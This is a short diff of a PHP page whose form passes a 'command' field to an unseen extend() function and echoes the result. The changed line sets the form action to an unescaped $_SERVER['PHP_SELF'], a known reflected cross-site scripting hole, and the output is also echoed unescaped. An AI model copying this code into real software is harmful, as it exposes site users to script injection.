@@ -27,7 +27,7 @@
             $r = extend($_POST["command"]);
         }
     ?>
-    <form action="" method="post">
+    <form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
         <textarea name="command" cols="30" rows="10"><?php echo $r;?></textarea>
         <input type="submit" value="Submit">
     </form>
